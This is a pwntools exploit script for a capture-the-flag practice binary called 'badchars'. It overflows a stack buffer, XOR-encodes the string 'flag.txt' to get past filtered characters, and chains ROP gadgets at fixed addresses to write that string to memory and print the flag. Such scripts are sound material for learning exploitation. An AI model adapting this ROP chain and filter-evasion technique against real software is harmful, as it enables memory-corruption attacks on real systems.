#!/usr/bin/env python3
from pwn import *
import sys

nop = b"\x90"
null = b"\x00"

intkey = 0x0A
length = 0x20

pop_rdi = p64(0x00000000004006a3)
pop_r14_r15 = p64(0x00000000004006a0)
xor_r15_r14 = p64(0x0000000000400628)
mov_r13_r12 = p64(0x0000000000400634)
pop_r12_r13 = p64(0x000000000040069c)
print_file = p64(0x0000000000400510)
section = 0x0000000000601038

badchars = [ 0x78, 0x67, 0x61, 0x2e ]

def Generate(buffer: bytes) -> bytes:
	array = b""
	
	for i in range(len(buffer)):
		c = buffer[i] ^ intkey
		array += c.to_bytes(1, "little")

	payload = (nop * (length + 8))
	payload += pop_r12_r13 + array + p64(section) + p64(1) + p64(1) + mov_r13_r12

	for i in range(len(array)):
		payload += pop_r14_r15 
		payload += p64(intkey) + p64(section + i)
		payload += xor_r15_r14

	payload += pop_rdi + p64(section) + print_file
	return payload


if __name__ == "__main__":

	p = process("badchars")
	context.update(arch="amd64", os="linux")

	if len(sys.argv) > 1:
		if sys.argv[1] == "gdb":
			gdb.attach(p)
		else:
			print(" ! unkown option {}".format(sys.argv[1]))
			exit(1)

	payload = Generate(b"flag.txt")

	p.send(payload)
	print(p.recvall())

